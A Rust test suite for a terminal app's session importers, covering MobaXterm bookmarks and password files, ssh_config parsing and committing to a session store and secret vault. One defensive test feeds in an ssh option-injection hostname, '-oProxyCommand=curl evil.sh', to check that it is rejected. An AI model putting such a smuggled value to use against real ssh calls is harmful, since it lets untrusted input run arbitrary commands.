//! The import parsers, against the shapes these files really take.

use bhterm_core::import::{self, ImportError, Source};
use bhterm_core::{ConnectionType, SecretVault, SessionStore};

#[test]
fn mobaxterm_bookmarks_with_nesting() {
    let file = "\
[Bookmarks]
SubRep=
ImgNum=42
Prod web=#109#0%web1.example.com%2222%deploy%%-1%-1%%%%%0%0%0%
Old desktop=#97#0%10.0.0.5%5901%%%-1%
Router=#98#0%10.0.0.1%23%admin%

[Bookmarks_2]
SubRep=Clients\\Acme
ImgNum=0
db=#109#0%db.acme.test%22%root%
";
    let (sessions, warnings) = import::parse_mobaxterm(file);
    assert_eq!(sessions.len(), 3, "the telnet entry is not a session");
    assert_eq!(warnings.len(), 1);
    assert!(warnings[0].contains("98"), "the unsupported type is named: {warnings:?}");

    let web = &sessions[0];
    assert_eq!((web.hostname.as_str(), web.port, web.username.as_str()), ("web1.example.com", 2222, "deploy"));
    assert_eq!(web.connection_type, ConnectionType::Ssh);
    assert!(web.folder_path.is_empty());

    let vnc = &sessions[1];
    assert_eq!(vnc.connection_type, ConnectionType::Vnc);
    assert_eq!(vnc.port, 5901);

    // SubRep is backslash-separated, and only the section it appears in.
    assert_eq!(sessions[2].folder_path, vec!["Clients", "Acme"]);
}

#[test]
fn mobaxterm_passwords_prefers_typed_entries() {
    let file = "\
ssh2222:deploy@web1.example.com = s3cret
vnc:admin@10.0.0.5 = vncpass
rdp:user@win.example.com = nope
deploy@web1.example.com = s3cret
lonely@other.example.com = otherpass
";
    let (sessions, warnings) = import::parse_moba_passwords(file);
    assert_eq!(sessions.len(), 3, "the bare duplicate must not add a host: {sessions:#?}");
    assert_eq!(sessions[0].port, 2222, "the port rides on the protocol prefix");
    assert_eq!(sessions[0].password.as_deref(), Some("s3cret"));
    assert_eq!(sessions[1].connection_type, ConnectionType::Vnc);
    // A bare line with no typed entry still becomes an SSH host on 22.
    assert_eq!(sessions[2].hostname, "other.example.com");
    assert_eq!(sessions[2].port, 22);
    assert!(warnings[0].contains("1 entry"), "rdp is counted, not dropped silently: {warnings:?}");
}

#[test]
fn password_may_contain_spaces_equals_and_at() {
    let (sessions, _) = import::parse_moba_passwords(
        "ssh:root@a.example.com = p a = ss@word\nb@b.example.com = x\nc@c.example.com = y\n",
    );
    assert_eq!(sessions[0].password.as_deref(), Some("p a = ss@word"));
}

#[test]
fn ssh_config_skips_wildcards_and_defaults_the_hostname() {
    let file = "\
# a comment
Host *
  ServerAliveInterval 30

Host web prod-web
  HostName web1.example.com
  User deploy
  Port 2222

Host bare
";
    let (sessions, _) = import::parse_ssh_config(file);
    assert_eq!(sessions.len(), 3, "two aliases plus the bare one: {sessions:#?}");
    assert_eq!(sessions[0].name, "web");
    assert_eq!(sessions[1].name, "prod-web");
    assert_eq!(sessions[0].hostname, "web1.example.com");
    assert_eq!(sessions[0].port, 2222);
    // No HostName: the alias is the hostname.
    assert_eq!(sessions[2].hostname, "bare");
    assert_eq!(sessions[2].port, 22);
}

#[test]
fn ssh_config_accepts_equals_separator() {
    let (sessions, _) = import::parse_ssh_config("Host=alias\nHostName=h.example.com\nPort=2022\n");
    assert_eq!(sessions.len(), 1);
    assert_eq!((sessions[0].hostname.as_str(), sessions[0].port), ("h.example.com", 2022));
}

#[test]
fn format_detection() {
    assert_eq!(import::parse("[Bookmarks]\n", "x.txt").unwrap().source, Source::MobaXterm);
    assert_eq!(
        import::parse("a@h1 = 1\nb@h2 = 2\nc@h3 = 3\n", "pw.txt").unwrap().source,
        Source::MobaXtermPasswords
    );
    assert_eq!(import::parse("Host x\n  HostName y\n", "config").unwrap().source, Source::SshConfig);

    // A .mobaconf with no readable bookmarks is the master-password blob, and
    // says so instead of "unrecognised".
    assert_eq!(
        import::parse("\u{1}\u{2}binary\u{0}", "MobaXterm.mobaconf").unwrap_err(),
        ImportError::EncryptedMobaConf
    );
    assert_eq!(import::parse("hello", "notes.txt").unwrap_err(), ImportError::UnrecognizedFormat);
}

#[test]
fn two_password_lines_are_not_enough_to_claim_the_format() {
    // Any key/value file can mention an address; demanding three keeps a
    // random .txt from being read as credentials.
    assert_eq!(
        import::parse("owner@example.com = me\ncontact@example.com = you\n", "meta.txt").unwrap_err(),
        ImportError::UnrecognizedFormat
    );
}

#[test]
fn commit_builds_the_tree_and_routes_passwords_to_the_vault() {
    let (sessions, warnings) = import::parse_mobaxterm(
        "[Bookmarks]\nSubRep=Clients\\Acme\nweb=#109#0%web.acme.test%22%root%\n",
    );
    let mut store = SessionStore::default();
    let mut vault = SecretVault::default();
    let result = import::commit(Source::MobaXterm, &sessions, warnings, &mut store, Some(&mut vault), "benjamin");

    assert_eq!(result.hosts_added, 1);
    assert_eq!(result.folders_added, 3, "the import root plus Clients/Acme");
    assert_eq!(store.folders[0].name, "MobaXterm Import");
    assert_eq!(store.folders[0].parent_folder_id, None);
    assert_eq!(store.folders[1].parent_folder_id, Some(store.folders[0].id));
    assert_eq!(store.hosts[0].folder_id, Some(store.folders[2].id));
    // No password in this format, so agent auth and nothing in the vault.
    assert!(matches!(store.hosts[0].auth_method, bhterm_core::AuthMethod::Agent {}));
    assert!(vault.all().is_empty());
}

#[test]
fn commit_stores_a_password_under_the_new_host_id() {
    let (sessions, warnings) =
        import::parse_moba_passwords("ssh:root@a.example.com = pw\nb@b.example.com = x\nc@c.example.com = y\n");
    let mut store = SessionStore::default();
    let mut vault = SecretVault::default();
    let result = import::commit(Source::MobaXtermPasswords, &sessions, warnings, &mut store, Some(&mut vault), "benjamin");

    assert_eq!(result.passwords_saved, 3);
    let host = &store.hosts[0];
    assert!(matches!(host.auth_method, bhterm_core::AuthMethod::Password {}));
    assert_eq!(vault.get(&host.secret_account_for()), Some("pw"));
}

#[test]
fn commit_refuses_an_option_injection_hostname() {
    // An export is untrusted input: a hostname starting with "-" would be
    // read by ssh as an option, so it must never reach the store.
    let sessions = {
        let (s, _) = import::parse_ssh_config("Host evil\n  HostName -oProxyCommand=curl evil.sh\n");
        s
    };
    let mut store = SessionStore::default();
    let result = import::commit(Source::SshConfig, &sessions, vec![], &mut store, None, "benjamin");

    assert_eq!(result.hosts_added, 0);
    assert_eq!(result.skipped, 1);
    assert!(store.hosts.is_empty());
    assert!(result.warnings[0].contains("not a usable hostname"), "{:?}", result.warnings);
}

#[test]
fn commit_strips_control_characters_and_clamps_long_names() {
    let sessions = vec![import::ParsedSession {
        name: format!("bad\nname\u{7}{}", "x".repeat(400)),
        hostname: "h.example.com".into(),
        port: 22,
        username: "root".into(),
        connection_type: ConnectionType::Ssh,
        folder_path: vec![],
        password: None,
    }];
    let mut store = SessionStore::default();
    import::commit(Source::SshConfig, &sessions, vec![], &mut store, None, "benjamin");

    let name = &store.hosts[0].name;
    assert!(!name.contains('\n') && !name.contains('\u{7}'), "{name:?}");
    assert_eq!(name.chars().count(), 200);
}

#[test]
fn an_empty_import_says_so_rather_than_making_an_empty_folder() {
    let mut store = SessionStore::default();
    let result = import::commit(Source::SshConfig, &[], vec![], &mut store, None, "benjamin");
    assert_eq!(result.folders_added, 0);
    assert!(store.folders.is_empty());
    assert!(result.warnings[0].contains("No sessions"));
}
